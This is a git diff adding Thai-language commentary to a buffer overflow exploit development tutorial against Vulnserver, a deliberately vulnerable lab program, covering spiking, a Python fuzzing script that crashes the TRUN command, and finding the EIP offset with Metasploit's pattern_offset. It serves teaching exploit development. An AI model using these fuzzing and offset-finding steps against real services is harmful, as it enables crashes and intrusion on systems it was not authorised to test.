@@ -1390,6 +1390,7 @@ run
 - LAB Preparation 
   - Windows insta
     - [Vulnserver](https://thegreycorner.com/vulnserver.html) เป็นโปรแกรมภาษา C ที่เขียนมาจงใจให้มีช่องโหว่ เพื่อการศึกษา exploit development สำหรับผู้เริ่มต้นมือใหม่ โดยจะทำตัวเป็น network service อยู่บน TCP พอร์ต 9999 ให้เราใช้ TCP client ต่อเข้าไปใช้งานได้ โดยเราสามารถใช้โปรแกรม Netcat เชื่อต่อผ่านพอร์ต 9999 และทดสอบใช้คำสั่ง HELP ได้ดังต่อไปนี้ 
+
     ![](./img/vulnserver.jpg)
 
     - [Immunity Debugger](https://www.immunityinc.com/products/debugger/)  เป็นโปรแกรมที่สามารถทำการ diassembly โปรแกรมได้ กล่าวคือสามารถแปลงโปรแกรมในที่นี้เราจะใช้ vulnserver.exe ให้อยู่ในรูปแบบของ instruction code ภาษา Assembly ซึ่งจะอยู่บนหน้าต่างด้านบนซ้ายของโปรแกรม แล้วถ้ารันโปรแกรมอยู่มันก็จะแสดงค่าใน stack memory ในหน้าต่างขวาล่าง และค่าของ CPU Register ในหน้าต่างด้านขวาบน
@@ -1466,14 +1467,34 @@ s_string_variable("0");
 # TRY to RUN script for each command
 generic_send_tcp 192.168.x.x 9999 stats.spk 0 0
 ```
+
+
+
+![](./img/sprike.jpg)
+
+ให้ดำเนินการทดสอบแต่ละ Command ที่อยู่ภายใต้ Vulnserver ซึ่งจะพบว่า Command **TRUN** เป็น Command ที่สามารถทำให้โปรแกรม Crash หรือหยุดทำงานไปได้ และหากตรวจสอบข้อมูลใน EBP จะพบว่ามีตัวอักษร A หรือ Hex Code 41 จำนวนมาก
+
+<<<<<<<<<< RESULT >>>>>>>>>>
+
+FOUND **TRUN** command is **VULNERABLE!!**
+  
+<<<<<<<<<< RESULT >>>>>>>>>>
+
 ----
-- Fuzzing 
-  - Python Script for FUZZ
+## Fuzzing 
+- การทำ Fuzzing จะเหมือนกับการทำ Spriking ซึ่งเป็นการส่งข้อความเข้าไปใน Command จำนวนมากๆ เพื่อหาช่องโหว่ของโปรแกรม โดย Spriking เป็นการค้นหา Command ที่มีช่องโหว่ แต่การทำ Fuzzing นั้นเป็นการเจาะจงยิงเฉพาะ Command ที่ค้นพบ ซึ่งในที่นี้คือคำสั่ง TRUN 
+- Python Script สำหรับทำ Fuzzing คำสั่ง TRUN
+  
 ```python
 #!/usr/bin/python
 #FUZZING Script 
+# ก่อนรัน Script จะต้องเพิ่มสิทธิสำหรับรันด้วยคำสั่ง 
+# chmod +x fuzz.py
+# python2 ./fuzz.py 
+
 import sys, socket
 from time import sleep
+# สร้างตัวแปร buffer ซึ่งมีค่าของตัวอักษร A จำนวน 100 ตัว
 buffer = "A" * 100
 # Enter IP Address of your HOST Here!!!!
 HOST = '............'
@@ -1482,16 +1503,36 @@ PORT = 9999
 while True:
   try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # เชื่อมต่อไปยังเครื่อง Server Vulnserver 
     s.connect((HOST,PORT))
+
+    # รัน TRUN Command และส่งตัวแปร buffer ไปยังโปรแกรรม 
     s.send(('TRUN /. :/' + buffer))
+    # ปิด Connection
     s.close()
+    # หน่วยเวลา 1 วินาที
     sleep(1)
+    # ขยายตัวแปร buffer ให้มีตัว A มากขึ้นครั้งละ 100 ตัวอักษร 
     buffer = buffer + "A"*100
   except:
+    # เป็นการตรวจสอบขนาดของ Buffer ที่ส่งไป 
     print "Fuzzing crashed at %s bytes" % str(len(buffer))
     sys.exit()
 
  ```
+หลังจากรันโปรแกรมด้วย Python จะพบว่าโปรแกรม vulnserver ได้หยุดทำงานไปเรียบร้อยแล้วให้กด Ctrl + c เพื่อหยุดการทำงานของ Script และตรวจสอบขนาดของข้อมูลที่ยิงไปยังโปรแกรมเป้าหมาย ซึ่งผลลัพธ์จากการทดสอบจะทำให้เราสามารถทราบขนาดที่จะใช้ในการโจมตีคร่าวๆ  คือ 3,000 bytes 
+
+ ![](./img/fuzzSize.jpg)
+
+
+ ![](./img/fuzzing.jpg)
+
+ <<<<<<<<<< RESULT >>>>>>>>>>
+
+FOUND **3000 Bytes** สำหรับนำไปสร้าง pattern ด้วยเครื่องมือ metasploit-framework
+  
+<<<<<<<<<< RESULT >>>>>>>>>>
+
 --- 
 - Find the Offset 
   
@@ -1527,10 +1568,18 @@ while True:
 
 ```
 
+หลังจากที่รัน Python Script แล้ว ให้สังเกต Pointer EIP จะมีค่าเท่ากับ **"6F43376F" ** ซึ่งเราจะต้องนำค่าดังกล่าวไปดูว่าตำแหน่งที่ทำให้โปรแกรมหยุดทำงานอยู่ที่ตำแหน่งใด โดยใช้ Metasploit Pattern offset ตรวจสอบ
+
+ ![](./img/findingoffset.jpg)
+
 FIND Offfset by copy EIP HEX number to find Offset index 
 ```bash 
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q <EIP-HEX-NUMBER>
 ```
+
+ ![](./img/offsetvalue.jpg)
+
+จากภาพด้านบนจะทำให้เราทราบตำแหน่งของ EIP จะอยู่ที่ "2002"
 
 ---
 - Overwriting the EIP 
